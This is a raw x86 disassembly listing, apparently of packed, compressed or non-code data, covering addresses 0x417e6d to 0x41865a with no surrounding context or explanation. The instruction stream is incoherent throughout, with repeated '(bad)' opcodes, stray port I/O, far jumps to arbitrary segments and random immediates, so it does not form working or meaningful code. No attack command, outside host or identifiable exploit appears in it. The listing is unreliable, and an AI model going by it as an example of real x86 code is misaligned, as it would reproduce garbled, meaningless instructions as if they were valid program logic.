  417e6d:	scas   al,BYTE PTR es:[edi]
  417e6e:	and    esp,DWORD PTR [ebx+0x4e88b084]
  417e74:	sahf   
  417e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e76:	sub    DWORD PTR [ebp-0x5ec8fbc9],eax
  417e7c:	mov    bl,0xcb
  417e7e:	dec    ebp
  417e7f:	dec    eax
  417e80:	mov    edi,0xeea16e93
  417e85:	push   cs
  417e86:	aas    
  417e87:	pusha  
  417e88:	pushf  
  417e89:	and    ebp,esi
  417e8b:	bound  esp,QWORD PTR [ebp-0x22]
  417e8e:	test   al,0xb4
  417e90:	shl    DWORD PTR [eax-0x27],1
  417e93:	cmp    DWORD PTR [ebx+esi*1+0x6f5da130],edi
  417e9a:	outs   dx,BYTE PTR ds:[esi]
  417e9b:	push   edi
  417e9c:	xchg   ebp,eax
  417e9d:	add    DWORD PTR [esi],eax
  417e9f:	(bad)  [eax-0x6b]
  417ea2:	push   edi
  417ea3:	les    edx,FWORD PTR [edi]
  417ea5:	shr    ebp,1
  417ea7:	ins    DWORD PTR es:[edi],dx
  417ea8:	sbb    eax,0x92fa39a8
  417ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eae:	in     al,0xf0
  417eb0:	sub    BYTE PTR [ecx-0x10],ah
  417eb3:	xchg   edi,eax
  417eb4:	outs   dx,BYTE PTR ds:[esi]
  417eb5:	lods   al,BYTE PTR ds:[esi]
  417eb6:	xchg   edx,eax
  417eb7:	mov    eax,0xd0ee2860
  417ebc:	fisub  WORD PTR [edx+0x61]
  417ebf:	xchg   esp,eax
  417ec0:	retf   0x8a79
  417ec3:	mov    eax,ds:0x2f08cf51
  417ec8:	jmp    0x34febb5f
  417ecd:	call   0x9c0ca2af
  417ed2:	lahf   
  417ed3:	(bad)  
  417ed4:	fsub   st(0),st
  417ed6:	(bad)  
  417ed7:	dec    esi
  417ed8:	popf   
  417ed9:	pusha  
  417eda:	cmp    edi,DWORD PTR [ecx-0x5e]
  417edd:	ss mov ah,0x5f
  417ee0:	add    al,0xbd
  417ee2:	out    0xe5,al
  417ee4:	pop    esi
  417ee5:	push   ds
  417ee6:	jno    0x417e8b
  417ee8:	(bad)  
  417ee9:	shr    DWORD PTR [edx+0x3c607eb7],0x3f
  417ef0:	test   BYTE PTR [edx],al
  417ef2:	sub    BYTE PTR [edi+eax*8],0xa2
  417ef6:	jmp    0x417e89
  417ef8:	add    eax,0xcbb0d07a
  417efd:	xchg   esi,ecx
  417eff:	mov    bh,0x72
  417f01:	and    esp,0xb5a7d8a0
  417f07:	outs   dx,DWORD PTR ds:[esi]
  417f08:	ret    0x5165
  417f0b:	xor    al,0xea
  417f0d:	out    0xeb,eax
  417f0f:	pop    esp
  417f10:	sbb    eax,0x54561bd
  417f15:	mov    eax,ds:0x60e8a88f
  417f1a:	xor    al,0x73
  417f1c:	inc    ebx
  417f1d:	jae    0x417f4e
  417f1f:	mov    edi,ecx
  417f21:	loope  0x417f11
  417f23:	jmp    0xfc874d7
  417f28:	ja     0x417f55
  417f2a:	xchg   esi,eax
  417f2b:	mov    eax,ds:0x53d1fd83
  417f30:	dec    ebx
  417f31:	aad    0x5f
  417f33:	data16 clc 
  417f35:	jnp    0x417f1d
  417f37:	inc    ecx
  417f38:	pop    esi
  417f39:	test   DWORD PTR [edi+0x3fb1bb5],ebx
  417f3f:	in     al,dx
  417f40:	clc    
  417f41:	pusha  
  417f42:	push   esp
  417f43:	clc    
  417f44:	lods   ax,WORD PTR ds:[esi]
  417f46:	stos   BYTE PTR es:[edi],al
  417f47:	rcl    ah,1
  417f49:	push   eax
  417f4a:	out    0x20,eax
  417f4c:	aad    0x83
  417f4e:	inc    ebp
  417f4f:	das    
  417f50:	sahf   
  417f51:	push   ebx
  417f52:	mov    ah,0x60
  417f54:	je     0x417f03
  417f56:	push   cs
  417f57:	das    
  417f58:	imul   esp,DWORD PTR [eax+0x7],0x7e693acb
  417f5f:	mov    ebp,0xb7ecc2d3
  417f64:	or     ecx,DWORD PTR [edi-0x423d9ea1]
  417f6a:	add    cl,BYTE PTR [ecx+0x4a]
  417f6d:	mov    al,ds:0xa86a5e7
  417f72:	shl    DWORD PTR [edi+0x3c],0xe1
  417f76:	and    BYTE PTR [ebp-0x144daa43],0xc7
  417f7d:	pusha  
  417f7e:	and    BYTE PTR [ebx-0x7d36f58],dl
  417f84:	mov    esi,0x60b3fb60
  417f89:	sub    DWORD PTR [esi+0x18],0x60ee78bb
  417f90:	repnz mov ebx,0x26656b5c
  417f96:	mov    ah,0xa1
  417f98:	scas   al,BYTE PTR es:[edi]
  417f99:	sub    ah,BYTE PTR [edx+0x59]
  417f9c:	iret   
  417f9d:	std    
  417f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f9f:	push   ecx
  417fa0:	jno    0x417fb1
  417fa2:	in     eax,dx
  417fa3:	aaa    
  417fa4:	popa   
  417fa5:	sub    DWORD PTR [edi+0x4a63faaf],esp
  417fab:	xchg   ebx,eax
  417fac:	and    BYTE PTR [eax-0x58],0xb2
  417fb0:	pop    edx
  417fb1:	xchg   esp,eax
  417fb2:	xchg   ebp,eax
  417fb3:	push   ss
  417fb4:	loop   0x417f50
  417fb6:	out    dx,al
  417fb7:	jmp    0x8edbe56
  417fbc:	dec    edi
  417fbd:	shl    BYTE PTR [ecx],cl
  417fbf:	lods   al,BYTE PTR ds:[esi]
  417fc0:	xchg   edx,eax
  417fc1:	adc    al,0x6a
  417fc3:	pop    edx
  417fc4:	loope  0x418030
  417fc6:	and    DWORD PTR [ecx],0xf8637406
  417fcc:	pop    ebp
  417fcd:	ret    
  417fce:	inc    ebp
  417fcf:	jnp    0x417f79
  417fd1:	lea    esp,[ebx]
  417fd3:	pop    eax
  417fd4:	xchg   BYTE PTR [ebp+0x57],bh
  417fd7:	mov    eax,ds:0x82e08f83
  417fdc:	loope  0x418001
  417fde:	jb     0x417faa
  417fe0:	pop    esi
  417fe1:	fidivr DWORD PTR [ebx-0x532ccf04]
  417fe7:	inc    eax
  417fe8:	push   edx
  417fe9:	sub    al,0x6f
  417feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fec:	aam    0x52
  417fee:	pop    ecx
  417fef:	inc    ebx
  417ff0:	data16 loope 0x41804f
  417ff3:	mov    ecx,edx
  417ff5:	mov    edi,0x9daf83ec
  417ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffb:	or     al,BYTE PTR [edi-0xcfee6c2]
  418001:	cmp    DWORD PTR [eax+0x4559eaa1],ecx
  418007:	std    
  418008:	cmp    al,0x5e
  41800a:	jecxz  0x417ff4
  41800c:	pop    ebp
  41800d:	cmc    
  41800e:	iret   
  41800f:	adc    BYTE PTR ds:[eax+eax*8+0x5dbe2e06],0xa1
  418018:	xchg   ecx,eax
  418019:	pop    ds
  41801a:	leave  
  41801b:	xor    ah,dl
  41801d:	and    ebp,0x3a725e55
  418023:	cs cs stos BYTE PTR es:[edi],al
  418026:	test   bh,dl
  418028:	jo     0x418087
  41802a:	jmp    0x417fbc
  41802c:	imul   edi,DWORD PTR [ebx-0x282116fd],0xd135948a
  418036:	xlat   BYTE PTR ds:[ebx]
  418037:	mov    al,ds:0x493b1bb0
  41803c:	test   BYTE PTR [eax],bl
  41803e:	leave  
  41803f:	mov    al,ds:0x4ba6dcdc
  418044:	sar    cl,0xe
  418047:	sbb    ebx,DWORD PTR [esi+0x22]
  41804a:	retf   0x8809
  41804d:	out    0xf0,eax
  41804f:	sbb    eax,0x30215292
  418054:	das    
  418055:	outs   dx,DWORD PTR ds:[esi]
  418056:	scas   al,BYTE PTR es:[edi]
  418057:	sub    eax,0x6933d00a
  41805c:	pop    esi
  41805d:	stc    
  41805e:	leave  
  41805f:	cmp    eax,0x3bf057af
  418064:	punpcklwd mm4,mm5
  418067:	mov    bh,0x26
  418069:	iret   
  41806a:	fmul   QWORD PTR [ecx]
  41806c:	xlat   BYTE PTR ds:[ebx]
  41806d:	jne    0x41805d
  41806f:	in     eax,0x83
  418071:	loopne 0x418049
  418073:	push   edi
  418074:	shl    DWORD PTR [ecx],1
  418076:	frstor [eax-0x6f71ede5]
  41807c:	stos   DWORD PTR es:[edi],eax
  41807d:	inc    edx
  41807e:	out    0x99,al
  418080:	xor    eax,0x5aa12ffc
  418085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418086:	sbb    DWORD PTR [ebx-0x577bc9e4],eax
  41808c:	fwait
  41808d:	aaa    
  41808e:	je     0x41805b
  418090:	add    al,0x51
  418092:	call   0xc389:0xee4df3af
  418099:	cld    
  41809a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41809b:	loope  0x418031
  41809d:	push   0x77
  41809f:	mov    eax,ds:0xe63773e
  4180a4:	call   0x5e940450
  4180a9:	jmp    0x60d2:0x28dc243a
  4180b0:	cld    
  4180b1:	push   0x7f5e7bda
  4180b6:	mov    ah,0xbc
  4180b8:	pop    ecx
  4180b9:	sar    BYTE PTR [eax+eiz*1-0x68119415],0x99
  4180c1:	xor    edi,DWORD PTR [ecx+0x46313e39]
  4180c7:	adc    DWORD PTR [esi+0x55dcb860],edi
  4180cd:	add    al,BYTE PTR [edi-0x11dc81ee]
  4180d3:	das    
  4180d4:	mov    ecx,0xa859f27c
  4180d9:	mov    al,ds:0x391aa10b
  4180de:	shr    DWORD PTR [ebp-0x59],1
  4180e1:	mov    edx,0x3f2e8123
  4180e6:	stc    
  4180e7:	or     al,BYTE PTR [ebp+0x11a14d92]
  4180ed:	pop    DWORD PTR [ebx+0x7b]
  4180f0:	push   cs
  4180f1:	dec    ebx
  4180f2:	ror    BYTE PTR [edx+ebx*2],cl
  4180f5:	and    eax,0x79d63b72
  4180fa:	outs   dx,BYTE PTR ds:[esi]
  4180fb:	sub    edx,DWORD PTR [ecx-0x50]
  4180fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180ff:	mov    ds:0xf9c52021,al
  418104:	(bad)  
  418106:	xor    dh,BYTE PTR [ecx+0x10e4497a]
  41810c:	aaa    
  41810d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41810e:	xor    al,dh
  418110:	pop    esi
  418111:	ja     0x41812e
  418113:	test   eax,0xb757f714
  418118:	jp     0x41817a
  41811a:	adc    bh,BYTE PTR [edx-0xedc0]
  418120:	retf   
  418121:	jmp    0xb0372f14
  418126:	xchg   ebx,eax
  418127:	dec    ebx
  418128:	cdq    
  418129:	cwde   
  41812a:	add    ah,BYTE PTR [ecx-0x1777fea3]
  418130:	adc    BYTE PTR [ecx+0x365e4c7d],ch
  418136:	adc    eax,0x64d32ce6
  41813b:	xchg   ebx,ebx
  41813d:	pusha  
  41813e:	jae    0x41817e
  418140:	gs dec esp
  418142:	(bad)
  418146:	out    0x33,eax
  418148:	jg     0x418167
  41814a:	xchg   ebp,eax
  41814b:	std    
  41814c:	out    dx,al
  41814d:	mov    bl,0xc9
  41814f:	mov    BYTE PTR [edi+0x66],dh
  418152:	mov    BYTE PTR [edi+0x4cbca6de],bl
  418158:	dec    ebp
  418159:	push   cs
  41815a:	mov    eax,0x31f25e97
  41815f:	jmp    0x41814b
  418161:	push   0x521d3db2
  418166:	add    DWORD PTR [edi+0x48],esi
  418169:	adc    BYTE PTR [ebp-0x2eee70ab],cl
  41816f:	test   BYTE PTR [edx],bh
  418171:	sub    ch,dh
  418173:	and    eax,0xc029d327
  418178:	lea    ecx,[esi]
  41817a:	iret   
  41817b:	mov    al,ds:0xab9ce685
  418180:	lods   al,BYTE PTR ds:[esi]
  418181:	mov    al,ds:0xdd534758
  418186:	adc    DWORD PTR [ebx*4+0x2831e66c],esi
  41818d:	inc    ebx
  41818e:	data16 jno 0x41817b
  418191:	dec    esi
  418192:	push   ebp
  418193:	jecxz  0x4181f6
  418195:	popa   
  418196:	xchg   esp,eax
  418197:	test   ebx,edx
  418199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41819a:	jbe    0x4181f7
  41819c:	mov    ebp,0x215656d5
  4181a1:	lea    ebx,[ecx-0x3d]
  4181a4:	xor    ch,BYTE PTR [ecx+0x77]
  4181a7:	cwde   
  4181a8:	inc    esi
  4181a9:	jmp    0x6afe:0x7d6c1ce7
  4181b0:	sbb    BYTE PTR [ecx-0x78],dh
  4181b3:	mov    eax,ds:0x132e4eb5
  4181b8:	push   esp
  4181b9:	pop    ebx
  4181ba:	mov    ds:0x6c1b5ecc,eax
  4181bf:	out    0x9a,al
  4181c1:	lea    ebp,[esi+edi*2-0x405a9f41]
  4181c8:	rcl    DWORD PTR [edi+eiz*8-0x122312bb],0xe7
  4181d0:	mov    dh,0x56
  4181d2:	out    dx,eax
  4181d3:	repz aad 0xfe
  4181d6:	bound  ebx,QWORD PTR [esi+0x8]
  4181d9:	popa   
  4181da:	bound  esp,QWORD PTR [ebx+0x64033a18]
  4181e0:	xor    esp,DWORD PTR [ecx]
  4181e2:	add    ah,BYTE PTR [edi]
  4181e4:	add    al,0x85
  4181e6:	cs push ds
  4181e8:	add    DWORD PTR [esi-0x10],0x32
  4181ec:	cdq    
  4181ed:	pop    edi
  4181ee:	sar    DWORD PTR [esi+0x5a2f7085],cl
  4181f4:	cmc    
  4181f5:	das    
  4181f6:	dec    edi
  4181f7:	jge    0x41826e
  4181f9:	and    eax,0x566a15ee
  4181fe:	xchg   BYTE PTR [esi],bl
  418200:	ja     0x418232
  418202:	fbld   TBYTE PTR [eax-0x770a63d2]
  418208:	dec    ebp
  418209:	lds    esp,FWORD PTR [esi+0x11d65e3b]
  41820f:	cmp    ebp,DWORD PTR ss:[edi-0x7a]
  418213:	inc    edx
  418214:	mov    esp,DWORD PTR [eax-0x35]
  418217:	fiadd  DWORD PTR [edi+ebx*2]
  41821a:	push   ss
  41821b:	lds    ebp,FWORD PTR [ebx+ecx*1-0x3e846612]
  418222:	push   edx
  418223:	push   eax
  418224:	repnz leave 
  418226:	loopne 0x4181cb
  418228:	cmp    DWORD PTR [edx],0x38
  41822b:	stc    
  41822c:	fs xor edi,DWORD PTR ss:[si+0x17]
  418232:	cmc    
  418233:	retf   
  418234:	add    ah,BYTE PTR [ebp-0x11b05f4f]
  41823a:	nop
  41823b:	jb     0x41824e
  41823d:	popa   
  41823e:	repz adc DWORD PTR [eax-0xca405fe],ebp
  418245:	(bad)  
  418246:	and    ecx,ebp
  418248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418249:	push   ecx
  41824a:	cmp    bl,BYTE PTR [ecx+0x6e878103]
  418250:	xchg   esi,eax
  418251:	mov    ds:0x7b6ca0f0,al
  418256:	or     BYTE PTR [ebx+0x2],cl
  418259:	xor    DWORD PTR ss:[eax+0x5e],eax
  41825d:	mov    cl,0xa5
  41825f:	popf   
  418260:	aas    
  418261:	cmp    BYTE PTR [edx-0x24],al
  418264:	jmp    0xe0aed5c9
  418269:	adc    al,BYTE PTR [edi-0x5e]
  41826c:	mov    WORD PTR [ebx+0x841aaee],ds
  418272:	mov    esp,0x64f23990
  418277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418278:	or     BYTE PTR [esi],al
  41827a:	test   DWORD PTR [edx+0x3969591],eax
  418280:	jae    0x418215
  418282:	out    dx,al
  418283:	push   cs
  418284:	in     al,dx
  418285:	leave  
  418286:	ret    0x6f92
  418289:	mov    esi,DWORD PTR [ecx+0x6ea57fa8]
  41828f:	sub    bl,BYTE PTR [ebx+edi*8-0x11]
  418293:	adc    edx,DWORD PTR [ecx]
  418295:	das    
  418296:	out    dx,al
  418297:	mov    ebx,0xfdb22517
  41829c:	aaa    
  41829d:	pop    esp
  41829e:	or     al,0x39
  4182a1:	in     al,dx
  4182a2:	dec    esi
  4182a3:	sbb    ebp,DWORD PTR [edx]
  4182a5:	inc    ebp
  4182a6:	out    dx,al
  4182a7:	mov    ebp,0xc404d01e
  4182ac:	inc    ebp
  4182ad:	jnp    0x41828b
  4182af:	mov    al,ds:0x5d07fb24
  4182b4:	and    ebx,edi
  4182b6:	sbb    al,0xea
  4182b8:	pop    esi
  4182b9:	dec    edx
  4182ba:	adc    ebp,DWORD PTR ds:0x2dfc7c74
  4182c0:	pop    ecx
  4182c1:	popa   
  4182c2:	stos   DWORD PTR es:[edi],eax
  4182c3:	cmp    al,0x6a
  4182c5:	mov    ds:0x85784b19,eax
  4182ca:	out    dx,al
  4182cb:	dec    esp
  4182cc:	or     cl,ah
  4182ce:	push   es
  4182cf:	stos   BYTE PTR es:[edi],al
  4182d0:	inc    edx
  4182d1:	nop
  4182d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182d3:	mov    eax,ds:0x93a1fea0
  4182d8:	cmp    ebp,DWORD PTR [edi]
  4182da:	xor    DWORD PTR [edi],ebx
  4182dc:	pop    ebx
  4182dd:	add    eax,0x2c8ec993
  4182e2:	push   ds
  4182e3:	xchg   DWORD PTR [esi],eax
  4182e5:	xor    DWORD PTR [ecx+0x20598fef],0xb2ce032c
  4182ef:	adc    BYTE PTR [eax],bh
  4182f1:	inc    edi
  4182f2:	pushf  
  4182f3:	sub    eax,0xef0a2e31
  4182f8:	pop    esi
  4182f9:	cmp    al,0xc7
  4182fb:	ficom  WORD PTR [ebp-0x3aa2c65d]
  418301:	pop    esp
  418302:	sub    bl,0xd9
  418305:	cmp    BYTE PTR ds:0xba7c9c21,al
  41830b:	lahf   
  41830c:	pop    esi
  41830d:	js     0x41831c
  41830f:	ins    DWORD PTR es:[edi],dx
  418310:	dec    ebp
  418311:	jb     0x41835a
  418313:	or     al,0x46
  418315:	inc    ebp
  418316:	arpl   WORD PTR [edi],bp
  418318:	sbb    ah,BYTE PTR [ecx+0x67]
  41831b:	jnp    0x4182b9
  41831d:	push   ss
  41831e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831f:	in     al,dx
  418320:	je     0x418360
  418322:	out    dx,al
  418323:	div    DWORD PTR [ecx-0x313ce333]
  418329:	or     DWORD PTR [eax-0xf],edi
  41832c:	jge    0x41838d
  41832e:	push   ds
  41832f:	inc    edx
  418330:	mov    ds:0x4ca8ef7a,al
  418335:	inc    ecx
  418336:	lds    eax,FWORD PTR [esi-0x1331dfaf]
  41833c:	pop    esi
  41833d:	jmp    0x42cc600d
  418342:	lock mov al,ds:0x3440cc77
  418348:	out    dx,eax
  418349:	pushf  
  41834a:	mov    ebp,0x1e1c5dc4
  41834f:	(bad)  
  418350:	inc    edx
  418351:	xchg   ebp,eax
  418352:	call   0x99a4:0x43218ad0
  418359:	mov    bh,0xc3
  41835b:	push   ds
  41835c:	adc    eax,0xca1d2e65
  418361:	mov    esi,0x79625aee
  418366:	pop    ebp
  418367:	xchg   ebx,eax
  418368:	pusha  
  418369:	out    0x8e,eax
  41836b:	mov    eax,ds:0xe8b48194
  418370:	shl    DWORD PTR [esi*4+0x5a8f5e95],1
  418377:	loop   0x41833a
  418379:	mov    eax,0x6156ef2d
  41837e:	mov    ds:0x38dd27d9,al
  418383:	loopne 0x418332
  418385:	or     ch,dh
  418387:	ficom  WORD PTR [ecx-0x6c45bac5]
  41838d:	popa   
  41838e:	or     esp,DWORD PTR [ecx-0x766cbff8]
  418394:	inc    edi
  418395:	ja     0x4183cd
  418397:	fldenv [ebx+0x30]
  41839a:	ins    BYTE PTR es:[edi],dx
  41839b:	in     al,dx
  41839c:	stos   DWORD PTR es:[edi],eax
  41839d:	rol    dh,0x78
  4183a0:	mov    fs,WORD PTR [ebp+0x17]
  4183a3:	mov    eax,ds:0x8c8aed5b
  4183a8:	cmp    DWORD PTR [eax-0x16a18288],ebx
  4183ae:	push   0x5b0b1d06
  4183b3:	stos   DWORD PTR es:[edi],eax
  4183b4:	mov    esp,0xdeea4962
  4183b9:	xchg   BYTE PTR [ecx],bh
  4183bb:	aam    0xbf
  4183bd:	sub    ebp,DWORD PTR [ebx+0x7f3f5e99]
  4183c3:	push   ebp
  4183c4:	aas    
  4183c5:	inc    esi
  4183c6:	mov    bl,0x25
  4183c8:	sbb    DWORD PTR [edi-0x1c4c5e7c],esp
  4183ce:	xchg   edi,eax
  4183cf:	or     bh,BYTE PTR [ecx+esi*1-0x4c]
  4183d3:	mov    al,0x5d
  4183d5:	adc    eax,0xede20423
  4183da:	cld    
  4183db:	xor    BYTE PTR [edx-0x51],0x94
  4183df:	lods   al,BYTE PTR ds:[esi]
  4183e0:	jb     0x4183e3
  4183e2:	outs   dx,BYTE PTR ds:[esi]
  4183e3:	mov    al,BYTE PTR [ebx+0x1c]
  4183e6:	dec    ebx
  4183e7:	fistp  WORD PTR ds:0x3190ee16
  4183ed:	gs cmp ch,bl
  4183f0:	add    al,0x31
  4183f2:	fsub   QWORD PTR [eax+0x4f349b29]
  4183f8:	lods   al,BYTE PTR ds:[esi]
  4183f9:	aad    0xcb
  4183fb:	push   0xfffffffe
  4183fd:	shl    DWORD PTR [esp+edi*8+0x64],cl
  418401:	bound  ecx,QWORD PTR [edx]
  418403:	mov    eax,ds:0x5c16672a
  418408:	fstp   st(5)
  41840a:	xor    DWORD PTR [ecx+0x64],0xe55f39c3
  418411:	fnstenv [ebp-0x5a1da194]
  418417:	dec    edi
  418418:	mov    al,ds:0x34d9095e
  41841d:	aad    0x1a
  41841f:	push   edx
  418420:	je     0x4183a7
  418422:	out    0xc3,eax
  418424:	iret   
  418425:	cld    
  418426:	xchg   ebx,eax
  418427:	and    al,0x40
  418429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842a:	fst    DWORD PTR [eax]
  41842c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41842d:	dec    ecx
  41842e:	dec    ecx
  41842f:	mov    eax,ds:0x2bdedbdd
  418434:	push   ebp
  418435:	push   esp
  418436:	sbb    ch,BYTE PTR [ebp+0x79299454]
  41843c:	mov    ch,0x60
  41843e:	sar    DWORD PTR [edi-0x64],0x17
  418442:	sahf   
  418443:	lock xchg ebx,eax
  418445:	jb     0x418477
  418447:	pop    eax
  418448:	jae    0x4184a6
  41844a:	sbb    bl,0xa7
  41844d:	loopne 0x4183d8
  41844f:	cmc    
  418450:	mov    eax,0x35962577
  418455:	ror    cl,cl
  418457:	cwde   
  418458:	pop    ebx
  418459:	jp     0x4184d0
  41845b:	dec    edi
  41845c:	dec    esi
  41845d:	mov    es,WORD PTR [edi+0x4d605076]
  418463:	push   ebp
  418464:	ret    
  418465:	xor    al,0xcd
  418467:	sbb    eax,0x4536a1ef
  41846c:	mov    al,ds:0x644deede
  418471:	push   esp
  418472:	mov    cl,0x26
  418474:	enter  0x83f5,0xa1
  418478:	mov    ebx,0x94b34be2
  41847d:	inc    ebp
  41847e:	in     al,0xc7
  418480:	pop    ebx
  418481:	imul   esp,ecx,0x10770a41
  418487:	mov    eax,ds:0x68555eb7
  41848c:	inc    eax
  41848d:	popa   
  41848e:	cmp    eax,0xd8ed5aaa
  418493:	add    BYTE PTR [ecx],0xce
  418496:	pop    edx
  418497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418498:	arpl   si,di
  41849a:	sbb    cl,ch
  41849c:	clc    
  41849d:	pop    ds
  41849e:	cmp    edi,edx
  4184a0:	int    0xa6
  4184a2:	sub    ah,BYTE PTR [edi-0x268c9f70]
  4184a8:	jl     0x418433
  4184aa:	push   edx
  4184ab:	ja     0x418515
  4184ad:	dec    edx
  4184ae:	out    dx,al
  4184af:	and    DWORD PTR [edi],ecx
  4184b1:	inc    eax
  4184b2:	std    
  4184b3:	sub    al,0xf9
  4184b5:	mov    ds:0x609c7edf,al
  4184ba:	lods   eax,DWORD PTR ds:[esi]
  4184bb:	pop    ebx
  4184bc:	ja     0x41848b
  4184be:	xchg   ebx,eax
  4184bf:	pop    ds
  4184c0:	ss push ecx
  4184c2:	out    dx,al
  4184c3:	lahf   
  4184c4:	popa   
  4184c5:	mov    al,ds:0x3fccf20e
  4184ca:	sub    cl,BYTE PTR [esi+0x661ddecb]
  4184d0:	and    ebx,ebx
  4184d2:	shl    DWORD PTR [eax+0x64],1
  4184d5:	xchg   esp,eax
  4184d6:	jl     0x41851e
  4184d8:	pop    ebp
  4184d9:	jne    0x418501
  4184db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184dc:	test   eax,0x724af944
  4184e1:	xchg   ecx,eax
  4184e2:	dec    esp
  4184e3:	in     eax,dx
  4184e4:	xor    BYTE PTR [ecx+0x43],ah
  4184e7:	cmp    eax,0xd337adf5
  4184ec:	test   bl,cl
  4184ee:	out    dx,al
  4184ef:	and    BYTE PTR [ebx],ch
  4184f1:	call   0xa161:0xbc608732
  4184f8:	pop    edx
  4184f9:	push   0x99057576
  4184fe:	shl    al,0x37
  418501:	fimul  DWORD PTR [edi-0x17eae5d8]
  418507:	inc    ecx
  418508:	cmp    ebx,eax
  41850a:	pusha  
  41850b:	popa   
  41850c:	and    eax,ebx
  41850e:	mov    esp,0xb45becf8
  418513:	icebp  
  418514:	mov    ds:0xbd67d956,eax
  418519:	imul   ebx,DWORD PTR [ecx],0x80887671
  41851f:	jle    0x41857f
  418521:	push   ebp
  418522:	and    al,0xdf
  418524:	std    
  418525:	inc    ebx
  418526:	mov    bh,0x58
  418528:	mov    ecx,DWORD PTR [ecx-0x30]
  41852b:	aam    0xe1
  41852d:	pusha  
  41852e:	mov    cl,0x5e
  418530:	call   DWORD PTR [ecx]
  418532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418533:	fs pusha 
  418535:	ja     0x41850e
  418537:	lods   al,BYTE PTR ds:[esi]
  418538:	jg     0x418553
  41853a:	or     eax,0x5dddaf21
  41853f:	mov    al,0xc6
  418541:	pusha  
  418542:	sbb    bl,al
  418544:	fldenv [edx]
  418546:	xchg   edi,eax
  418547:	leave  
  418548:	iret   
  418549:	iret   
  41854a:	cmc    
  41854b:	test   DWORD PTR [edi],ecx
  41854d:	cmc    
  41854e:	mov    ecx,0xc0a8a520
  418553:	jb     0x4184ee
  418555:	pop    ecx
  418556:	out    0x7,al
  418558:	lods   al,BYTE PTR ds:[esi]
  418559:	xchg   ebp,eax
  41855a:	into   
  41855b:	inc    eax
  41855c:	rcl    bh,0xe
  41855f:	sbb    eax,0x53b56e5e
  418564:	jle    0x41854c
  418566:	dec    ecx
  418567:	sahf   
  418568:	cmp    edi,DWORD PTR [ecx+0x3ca5a15c]
  41856e:	outs   dx,BYTE PTR ds:[esi]
  41856f:	std    
  418570:	out    dx,eax
  418571:	lods   al,BYTE PTR ds:[esi]
  418572:	sub    BYTE PTR [edx-0x6e1a40a3],0x5
  418579:	fs pop ecx
  41857b:	lock push ds
  41857d:	xchg   ecx,eax
  41857e:	pop    ebx
  41857f:	bound  esp,QWORD PTR [ebx+0x47a0f22e]
  418585:	jmp    0xcb20:0xbe3c2629
  41858c:	pop    esi
  41858d:	adc    BYTE PTR [edx],ch
  41858f:	int    0x13
  418591:	xor    esi,edi
  418593:	or     BYTE PTR cs:[ecx+0x6c],ah
  418597:	repz xchg al,dh
  41859a:	stos   BYTE PTR es:[edi],al
  41859b:	int    0xbd
  41859d:	push   cs
  41859e:	in     eax,dx
  41859f:	pop    es
  4185a0:	enter  0x7abd,0xb
  4185a4:	xor    al,BYTE PTR [edi-0x5187ec8]
  4185aa:	ret    
  4185ab:	mov    al,ds:0x859e8ea6
  4185b0:	xor    BYTE PTR [ebp+0x5d5ee43a],dl
  4185b6:	xchg   dl,bh
  4185b8:	enter  0x4063,0x2d
  4185bc:	jl     0x418625
  4185be:	mov    DWORD PTR [edi-0x22],ebx
  4185c1:	sub    al,0x1d
  4185c3:	sti    
  4185c4:	out    0x12,al
  4185c6:	imul   ecx,DWORD PTR [edx-0x73fd18a2],0x70ddea76
  4185d0:	jns    0x418632
  4185d2:	push   edx
  4185d3:	push   ecx
  4185d4:	cmc    
  4185d5:	xor    eax,0xe166cd88
  4185da:	out    0x26,eax
  4185dc:	popa   
  4185dd:	stc    
  4185de:	pop    ds
  4185df:	punpckhdq mm7,QWORD PTR [esi+0x2e]
  4185e3:	sbb    cl,BYTE PTR [edx]
  4185e5:	lods   eax,DWORD PTR ds:[esi]
  4185e6:	push   es
  4185e7:	mov    eax,ds:0x37c1fa0f
  4185ec:	xor    eax,0x5e412009
  4185f1:	inc    ebp
  4185f2:	out    dx,eax
  4185f3:	rol    dh,cl
  4185f5:	fsubp  st(4),st
  4185f7:	pop    edi
  4185f8:	pop    ds
  4185f9:	popa   
  4185fa:	xchg   ebx,eax
  4185fb:	add    al,0x15
  4185fd:	and    esi,DWORD PTR [ecx]
  4185ff:	repz gs shr edi,0x2c
  418604:	ret    0x9101
  418607:	or     BYTE PTR [edi+0x1ecc7240],0x6f
  41860e:	mov    ah,BYTE PTR [ecx-0x61ecc6eb]
  418614:	mov    DWORD PTR fs:[edi+0x73],edx
  418618:	mov    BYTE PTR [edi-0x3fee5512],ch
  41861e:	cmp    dh,0xf7
  418621:	mov    eax,ds:0xc96aa137
  418626:	or     eax,0xec05a551
  41862b:	and    ebx,DWORD PTR [esi-0x4a]
  41862e:	xor    al,0x47
  418630:	mov    dl,al
  418632:	cmc    
  418633:	shr    BYTE PTR [ebx],1
  418635:	popa   
  418636:	add    esi,DWORD PTR [esp+ebp*8]
  418639:	int    0xfd
  41863b:	and    dh,BYTE PTR [eax+0x2416ee3d]
  418641:	xchg   DWORD PTR [edi+0x30bd87c9],ecx
  418647:	mov    eax,ds:0x6d6e067e
  41864c:	or     ah,BYTE PTR [edx]
  41864e:	jne    0x418659
  418650:	pop    esi
  418651:	test   esi,0x51123b9
  418657:	out    0x3e,eax
  418659:	push   edx
  41865a:	push   ebx
